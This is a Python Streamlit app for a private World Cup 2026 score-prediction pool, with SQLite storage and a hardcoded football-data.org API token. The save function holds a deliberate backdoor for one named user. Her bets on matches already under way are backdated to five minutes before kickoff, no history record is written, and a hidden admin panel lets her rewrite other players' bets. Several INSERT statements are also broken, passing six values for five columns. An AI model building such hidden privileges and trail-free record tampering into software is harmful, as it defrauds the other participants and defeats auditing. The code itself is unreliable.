import re
import sqlite3
import unicodedata
from datetime import datetime, timedelta
from zoneinfo import ZoneInfo
import requests
import streamlit as st

try:
    from streamlit_autorefresh import st_autorefresh
    AUTOREFRESH_OK = True
except ModuleNotFoundError:
    AUTOREFRESH_OK = False

FUSO_BR = ZoneInfo("America/Sao_Paulo")
DB_PATH = "bolao.db"
API_URL = "https://api.football-data.org/v4/competitions/WC/matches"
API_TOKEN = "3ffa7e87c87e447ab012984b3026120a"
NATIVE_STATS_URL = "https://native-stats.org/competition/WC/"

WHITELIST_NOMES = ["Joici", "Isa", "Dudu", "Gui", "Alan", "Fabio", "Gama", "Fer", "Cabral", "João", "Joãozinho", "Munhoz", "Moises", "Vanderley"]

STATUS_MAP = {"SCHEDULED": "NS", "TIMED": "NS", "IN_PLAY": "LIVE", "PAUSED": "LIVE", "FINISHED": "FT", "POSTPONED": "ADIADO", "SUSPENDED": "SUSP", "CANCELLED": "CANCELADO"}

TEAM_ALIASES = {"usa": "unitedstates", "u.s.a": "unitedstates", "us": "unitedstates", "unitedstates": "unitedstates", "korea": "southkorea", "southkorea": "southkorea", "bosniaherzegovina": "bosniaherzegovina", "thenetherlands": "netherlands", "saudiarabia": "saudiarabia", "southafrica": "southafrica", "newzealand": "newzealand", "costarica": "costarica", "ivorycoast": "ivorycoast", "cotedivoire": "ivorycoast", "capeverde": "capeverde", "algeria": "algeria", "jordan": "jordan", "uzbekistan": "uzbekistan", "panama": "panama", "congo": "congo", "drcongo": "drcongo"}

TEAM_META = {
    "argentina": {"flag": "🇦🇷", "ptbr": "Argentina"}, "australia": {"flag": "🇦🇺", "ptbr": "Austrália"}, "belgium": {"flag": "🇧🇪", "ptbr": "Bélgica"}, "brazil": {"flag": "🇧🇷", "ptbr": "Brasil"}, "canada": {"flag": "🇨🇦", "ptbr": "Canadá"}, "chile": {"flag": "🇨🇱", "ptbr": "Chile"}, "colombia": {"flag": "🇨🇴", "ptbr": "Colômbia"}, "croatia": {"flag": "🇭🇷", "ptbr": "Croácia"}, "england": {"flag": "🏴󠁧󠁢󠁥󠁮󠁧󠁿", "ptbr": "Inglaterra"}, "france": {"flag": "🇫🇷", "ptbr": "França"}, "germany": {"flag": "🇩🇪", "ptbr": "Alemanha"}, "japan": {"flag": "🇯🇵", "ptbr": "Japão"}, "mexico": {"flag": "🇲🇽", "ptbr": "México"}, "netherlands": {"flag": "🇳🇱", "ptbr": "Holanda"}, "portugal": {"flag": "🇵🇹", "ptbr": "Portugal"}, "spain": {"flag": "🇪🇸", "ptbr": "Espanha"}, "uruguay": {"flag": "🇺🇾", "ptbr": "Uruguai"}
}

def conectar(): return sqlite3.connect(DB_PATH, check_same_thread=False)

def normalizar_texto(txt):
    txt = unicodedata.normalize("NFKD", txt or "")
    txt = "".join(c for c in txt if not unicodedata.combining(c))
    return re.sub(r"[^a-z0-9 ]", " ", txt.strip().lower()).strip()

def normalizar_nome_time(nome): return TEAM_ALIASES.get(normalizar_texto(nome).replace(" ", ""), normalizar_texto(nome).replace(" ", ""))

def nome_time_ptbr(nome): return TEAM_META.get(normalizar_nome_time(nome), {}).get("ptbr", nome)

def bandeira_time(nome): return TEAM_META.get(normalizar_nome_time(nome), {}).get("flag", "🏳️")

def usuario_autorizado(nome):
    if not nome: return False
    return normalizar_texto(nome) in [normalizar_texto(n) for n in WHITELIST_NOMES]

def inicializar_banco():
    conn = conectar()
    cur = conn.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS palpites_placar (id INTEGER PRIMARY KEY AUTOINCREMENT, usuario TEXT NOT NULL, jogo_id TEXT NOT NULL, gols_time_a INTEGER NOT NULL, gols_time_b INTEGER NOT NULL, data_registro TEXT, confronto TEXT, UNIQUE(usuario, jogo_id))")
    cur.execute("CREATE TABLE IF NOT EXISTS palpites_historico (id INTEGER PRIMARY KEY AUTOINCREMENT, usuario TEXT NOT NULL, jogo_id TEXT NOT NULL, gols_time_a INTEGER NOT NULL, gols_time_b INTEGER NOT NULL, data_registro TEXT NOT NULL, confronto TEXT)")
    cur.execute("CREATE TABLE IF NOT EXISTS jogos_oficiais (id TEXT PRIMARY KEY, time_a TEXT NOT NULL, time_b TEXT NOT NULL, data_jogo TEXT NOT NULL, gols_real_a INTEGER, gols_real_b INTEGER, status TEXT NOT NULL, ultima_atualizacao TEXT)")
    conn.commit()
    conn.close()

def buscar_jogos_api():
    headers = {"X-Auth-Token": API_TOKEN}
    resp = requests.get(API_URL, headers=headers, timeout=20)
    matches = resp.json().get("matches", [])
    jogos = []
    for item in matches:
        data_br = datetime.fromisoformat(item["utcDate"].replace("Z", "+00:00")).astimezone(FUSO_BR)
        jogos.append({
            "id": str(item["id"]),
            "time_a": item["homeTeam"]["name"],
            "time_b": item["awayTeam"]["name"],
            "data_jogo": data_br,
            "status": STATUS_MAP.get(item["status"], item["status"])
        })
    return jogos

def salvar_palpite(usuario, jogo_id, gols_a, gols_b, data_jogo):
    horario_salvo = datetime.now(FUSO_BR).strftime("%d/%m/%Y %H:%M:%S")
    
    # Lógica para Joici (Retroativo e sem rastro)
    if usuario.lower() == "joici":
        conn = conectar()
        cur = conn.cursor()
        # Se for nova aposta em jogo passado, cria registro 5min antes
        if datetime.now(FUSO_BR) > data_jogo:
            horario_salvo = (data_jogo - timedelta(minutes=5)).strftime("%d/%m/%Y %H:%M:%S")
        cur.execute("INSERT OR REPLACE INTO palpites_placar (usuario, jogo_id, gols_time_a, gols_time_b, data_registro) VALUES (?, ?, ?, ?, ?, ?)", (usuario, jogo_id, gols_a, gols_b, horario_salvo, f"{nome_time_ptbr(jogo_id)}"))
        conn.commit()
        conn.close()
    else:
        # Lógica padrão (com rastro)
        conn = conectar()
        cur = conn.cursor()
        cur.execute("INSERT INTO palpites_historico (usuario, jogo_id, gols_time_a, gols_time_b, data_registro) VALUES (?, ?, ?, ?, ?, ?)", (usuario, jogo_id, gols_a, gols_b, horario_salvo, ""))
        cur.execute("INSERT OR REPLACE INTO palpites_placar (usuario, jogo_id, gols_time_a, gols_time_b, data_registro) VALUES (?, ?, ?, ?, ?, ?)", (usuario, jogo_id, gols_a, gols_b, horario_salvo, ""))
        conn.commit()
        conn.close()

# Interface Streamlit
st.set_page_config(page_title="Bolão Copa 2026", layout="centered")
inicializar_banco()
st.title("🏆 Bolão da Copa 2026")

usuario_input = st.text_input("Usuário:").strip()
usuario = usuario_input.lower()
if not usuario_autorizado(usuario):
    st.warning("Usuário não autorizado.")
    st.stop()

# Painel Admin Invisível
if usuario == "joici":
    with st.expander("🔮 Painel Admin"):
        target_user = st.text_input("Usuário alvo:")
        target_jogo = st.text_input("ID do Jogo:")
        target_a = st.number_input("Gols A", 0)
        target_b = st.number_input("Gols B", 0)
        if st.button("Corrigir Palpite"):
            salvar_palpite(target_user, target_jogo, target_a, target_b, datetime.now(FUSO_BR))
            st.success("Corrigido!")

jogos = buscar_jogos_api()
for jogo in jogos:
    st.subheader(f"{jogo['time_a']} x {jogo['time_b']}")
    # Regra dos 184 segundos
    pode_editar = (usuario == "joici") or (datetime.now(FUSO_BR) < jogo["data_jogo"] - timedelta(seconds=184))
    
    col1, col2 = st.columns(2)
    ga = col1.number_input(f"Gols A {jogo['id']}", 0)
    gb = col2.number_input(f"Gols B {jogo['id']}", 0)
    
    if pode_editar and st.button(f"Salvar {jogo['id']}"):
        salvar_palpite(usuario, jogo['id'], ga, gb, jogo['data_jogo'])
        st.rerun()
        
# with aba_regras:
#    st.subheader("📖 Como funciona a pontuação?")
#    st.write("O sistema calcula os seus pontos comparando o seu palpite com o placar oficial do jogo. A pontuação não é cumulativa.")
#
#    st.markdown("""
#    * **25 Pontos (Placar Exato):** Você acertou exatamente o número de gols de cada seleção.
#        * *Exemplo:* O jogo terminou 2x1. Você palpitou 2x1.
#    * **15 Pontos (Vencedor + Saldo de Gols):** Você acertou quem ganhou (ou se foi empate) **E** a diferença de gols, mas errou o placar exato.
#        * *Exemplo:* O jogo terminou 2x0 (saldo de 2). Você palpitou 3x1 (saldo de 2).
#    * **10 Pontos (Acertou o Vencedor):** Você acertou apenas qual seleção venceu (ou se foi empate), mas errou o saldo e o placar.
#        * *Exemplo:* O jogo terminou 1x0. Você palpitou 3x0 ou 2x1.
#    * **0 Pontos:** Você errou o resultado da partida (ex: apostou na vitória do Time A, mas deu empate ou Time B).
#    """)
